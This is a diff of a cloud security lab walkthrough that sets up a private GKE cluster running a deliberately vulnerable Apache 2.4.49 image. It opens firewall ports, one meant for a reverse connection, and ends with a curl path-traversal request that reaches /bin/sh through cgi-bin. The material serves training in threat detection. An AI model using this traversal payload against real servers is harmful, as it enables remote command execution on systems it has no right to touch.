@@ -63,19 +63,56 @@ gcloud compute networks subnets update default \
 ## Note: Go to "Compute Engine" > "VM Instances"
 * Click the SSH button on attacker-instance
 
-### Note: Step 6 to 10 run in the SSH of the VM
+```
+export ZONE=
+```
 
+```
+sudo snap remove google-cloud-cli
 
-### Note: Go back to Cloud Shell run step 11 to 13 commands
+curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
 
+tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
 
-### Note: Go to SSH of the VM and run step 16 17 18 19 commands
+./google-cloud-sdk/install.sh
+```
 
+```
+. ~/.bashrc
 
-### Note: Go back to Cloud Shell run step 20 21 commands
+gcloud components install kubectl gke-gcloud-auth-plugin --quiet
 
+gcloud container clusters create test-cluster \
+--zone "$ZONE" \
+--enable-private-nodes \
+--enable-private-endpoint \
+--enable-ip-alias \
+--num-nodes=1 \
+--master-ipv4-cidr "172.16.0.0/28" \
+--enable-master-authorized-networks \
+--master-authorized-networks "10.128.0.0/20"
+```
 
-## Note: Check the progress on task 4
+```
+kubectl create deployment apache-deployment \
+--replicas=1 \
+--image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable
+
+kubectl expose deployment apache-deployment \
+--name apache-test-service  \
+--type NodePort \
+--protocol TCP \
+--port 80
+
+NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
+NODE_PORT=$(kubectl get service apache-test-service \
+-o jsonpath={.spec.ports[0].nodePort})
+
+gcloud compute firewall-rules create apache-test-service-fw \
+--allow tcp:${NODE_PORT}
+
+gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
+```
 
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
